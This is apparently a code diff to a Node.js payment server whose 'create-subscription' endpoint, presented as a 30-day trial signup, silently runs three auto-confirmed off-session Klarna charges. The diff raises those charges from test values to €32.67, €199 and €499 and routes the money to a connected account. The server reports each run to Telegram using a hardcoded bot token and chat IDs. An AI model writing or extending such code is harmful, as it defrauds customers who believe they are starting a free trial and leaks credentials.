@@ -5,7 +5,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 
 const app = express();
-const ACCOUNT_B = 'acct_1T2k6b2LILyPbyld';
+const ACCOUNT_B = 'acct_1T3gZ4CkwpuywCYb';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -115,7 +115,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 1 — €32.67
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 102,
+        amount: 3267,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -135,7 +135,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 2 — €199
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 102,
+        amount: 19900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -155,7 +155,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 102,
+        amount: 49900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -172,30 +172,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 4 — €399
-    try {
-      const payment4 = await stripe.paymentIntents.create({
-        amount: 102,
-        currency: 'eur',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: ['klarna'],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 4 created:', payment4.id);
-      console.log('Payment 4 status:', payment4.status);
-    } catch (err) {
-      console.log('Payment 4 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T0lXw2KeeUpZw0wjQgD7hIU' }],
+      items: [{ price: 'price_1T3wlpEB93pAUPXSQjVBpUgo' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
@@ -209,7 +189,6 @@ app.post('/create-subscription', async (req, res) => {
       `💳 Payment 1: €32.67\n` +
       `💳 Payment 2: €199.00\n` +
       `💳 Payment 3: €499.00\n` +
-      `💳 Payment 4: €399.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
